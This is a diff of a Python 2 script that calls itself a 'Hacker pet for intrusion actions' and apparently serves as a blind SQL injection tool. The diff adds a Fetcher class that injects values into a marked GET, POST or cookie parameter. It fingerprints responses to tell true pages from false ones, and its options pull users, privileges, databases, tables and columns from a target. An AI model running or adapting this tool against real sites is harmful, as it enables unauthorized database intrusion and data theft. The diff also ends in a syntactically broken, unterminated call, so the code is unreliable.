@@ -1,12 +1,13 @@
 #!/usr/bin/env python2
-import re
-import sys
+import re, sys
+import md5, difflib
 import argparse
+import urllib, urllib2
+from random  import randint
 from urllib  import quote_plus
-from urllib2 import urlopen
 from Queue     import Queue
 from threading import Thread
-from time      import time
+from time      import time, sleep
 from datetime  import datetime
 
 p = argparse.ArgumentParser( description = 'Hacker pet for intrusion actions...' )
@@ -21,9 +22,9 @@ p.add_argument( '-D' , metavar = 'DATABASE' , help = 'database to use' )
 p.add_argument( '-T' , metavar = 'TABLE'    , help = 'table to use'    )
 p.add_argument( '-U' , metavar = 'TABLE'    , help = 'username to use' )
 
-g = p.add_mutually_exclusive_group( required=True )
-g.add_argument( '-s' , '--string'                                           ,  help = 'string to search on the page'    )
-g.add_argument( '-t' , '--timebased' , action = 'store_const', const = True ,  help = 'time based test (BENCHMARK())'   )
+#g = p.add_mutually_exclusive_group( required=True )
+#g.add_argument( '-s' , '--string'                                           ,  help = 'string to search on the page'    )
+#g.add_argument( '-t' , '--timebased' , action = 'store_const', const = True ,  help = 'time based test (BENCHMARK())'   )
 
 g = p.add_mutually_exclusive_group( required=True )
 g.add_argument( '-g' , '--get', choices = [ 'user', 'privs', 'dbs', 'tables', 'columns' ], help = 'wich object to retrieve from database' )
@@ -31,10 +32,145 @@ g.add_argument( '--sql', metavar = 'SQL_QUERY', help = 'this query will be retri
 
 args = p.parse_args()
 
-if args.post and '@' in args.post and '@' in args.url:
-    print 'error: use hackage in GET or POST, not in both'
+def err( msg ):
+    print 'error: ' + msg
     exit( 1 )
 
+
+class Fetcher( object ):
+    def __init__( self, **kargs ):
+        self.__dict__.update( kargs )
+        self.log_file = open( 'piglet.log', 'a' )
+        self.log_file.write( '\n---------[%s %s]--------\n' % ( datetime.now(), self.__class__.__name__ ) )
+
+
+    def log( self, lvl, txt, newline = True ):
+        if lvl <= self.log_lvl:
+            s = txt + ( newline and '\n' or '' )
+            self.log_file.write( s )
+            sys.stdout.write( s )
+            sys.stdout.flush()
+
+
+    def html( self, get = None, post = None, cookie = None ):
+        tsleep = 0.05
+        for n_try in xrange( 5 ):   ## try five times to get url
+            sleep( tsleep )
+            self.log( 2, "request %s:\n\tGET: %s\n\tPOST: %s\n\tCOOKIE:%s" % ( n_try, get, post, cookie ) )
+
+            o = urllib2.build_opener( )
+            r = urllib2.Request( get, post )
+            if cookie:
+                pass    ## TODO: try to find  first SQLi in cookie ;)
+
+            code, html = None, ""
+            try:
+                stream = o.open( r, timeout = 15 )
+                code = stream.getcode()
+                html = stream.read()
+            except urllib2.HTTPError, e:
+                code = e.getcode()
+                html = e.read()
+            except urllib2.URLError, e:
+                code = None
+                tsleep *= 4   ## quadruple time to sleep
+                print 'WARN: time out tsleep = %s' % tsleep
+
+            if code is not None:
+                break               ## go out from for loop...
+
+            if code is None:
+                err( 'can''t get page from server' )
+        return ( code, html )
+
+
+    def vhtml( self, v ):
+        r  = re.compile( r">>(.*)<<" )
+        ps = [ self.url, self.post, self.cookie ]
+        args = map( lambda x: x and r.sub( str( v ), x ), ps )  ## delete >><< (replace in x each >>...<< to v)
+        return self.html( args[ 0 ], args[ 1 ], args[ 2 ] )
+
+
+    def shash( self, v, m ):
+        """ Calculate stable hash for
+            value (v) and stability map (m)
+        """
+        ws = self.vhtml( v )[ 1 ].split()  ## take words
+        ws = map( lambda t: t[ 0 ], 
+                  filter( lambda t: t[ 1 ] == '-', 
+                          zip( ws, m ) ) )
+        return md5.md5( ''.join( ws ) ).hexdigest()
+
+
+    def gen_tester( self, v, cnt = 3 ):
+        """ Return tester which is function which gets value and return true/false
+            v   : value to tester for ( replacing >> ... << )
+            cnt : count of pages to compare ( for stability test )
+        """ 
+        ## take cnt pages from same url
+        ws_arr = []
+        for i in xrange( cnt ):
+            ws_arr.append( self.vhtml( v )[ 1 ].split() )  
+
+        ## does all elements of ws_arr equal ?
+        ws = ws_arr[ 0 ]
+        res = reduce( lambda a,b: a and b, map( lambda x: x == ws, ws_arr ) )  
+
+        smap = ''                   ## stability map (string
+        if not res:
+            smap = 'u' * len( ws )  ## assuming all words are unstable
+            self.log( 1, 'page is unstable, trying to found stable parts' )
+            s = difflib.SequenceMatcher( None, ws_arr[ 0 ], ws_arr[ 2 ] )  ## no filter and two set of words
+            bs = s.get_matching_blocks()
+
+            res = []
+            for b in bs:
+                smap = smap[ :b.a ] + '-' * b.size + smap[ b.a + b.size: ] ## mark words as stable
+                res.extend( ws[ b.a : b.a + b.size ] )                     ## take this words to result set
+            ws = res
+        else:
+            self.log( 1, 'page is stable' )
+            smap = '-' * len( ws )  ## all words stable
+
+        self.log( 1, 'stability map:\n' + smap )
+
+        h = self.shash( v, smap )
+        
+        return ( lambda x: self.shash( x, smap ) == h )
+
+
+    def look( self ):
+        """ Run basic tests (200 page, 404 page)...
+        """
+        r  = re.compile( r">>(.*)<<" )
+        ps = [ self.url, self.post, self.cookie ]
+
+        ## validate user input
+        rs = map( lambda x: x and r.search( x ), ps )
+        if sum( map( lambda x: x and 1 or 0, rs ) ) != 1:
+            err( 'please put   >>[value]<<   in *ONE* of get/post/cookie parameters (see: -u, -p, -c)' )
+
+        val = filter( lambda x: x, rs )[ 0 ].group( 1 )  ## take value from matching >>[value]<<
+
+        self.log( 0, 'getting ''200'' page (for original value=%s)...' % val )
+        self.is_ok  = self.gen_tester( val )             ## save tester for this value
+
+        self.log( 0, 'getting ''404'' page...' )
+        self.is_404 = self.gen_tester( 3141592699 )      ## 404 for very big and random value ...
+
+
+    def get( self, sql ):
+        return '----abstract method :)----'
+
+
+
+
+class FPager( Fetcher ):
+    """ Fetch data by changing id
+    """
+    def __init__( self, **kargs ):
+        Fetcher.__init__( self, **kargs )
+    
 
 class Searcher( object ):
     def __init__( self, **kargs ):
@@ -206,14 +342,23 @@ class SQL:
 
         return self.prepare( s % kargs )
 
-s = Searcher( url = args.url,
-              sss   = args.string,
-              bench = args.timebased,
-              post = args.post,
-              th_num = 1,
-              log_lvl = len( args.verbose ) )
-sql = SQL( args.engine )
+#s = Searcher( url = args.url,
+#              sss   = args.string,
+#              bench = args.timebased,
+#              post = args.post,
+#              th_num = 1,
+#              log_lvl = len( args.verbose ) )
+#sql = SQL( args.engine )
 
+f = [ FPager, FPager ][ 0 ]( url    = args.url,
+                             post   = args.post,
+                             cookie = args.cookie,
+                             log_lvl = len( args.verbose ) )
+f.look()
+print f.is_ok( 234234 )
+print f.is_404( 1333234234 )
+print f.shash( 13131313, 
+exit( 0 )
 
 db   = args.D
 tbl  = args.T
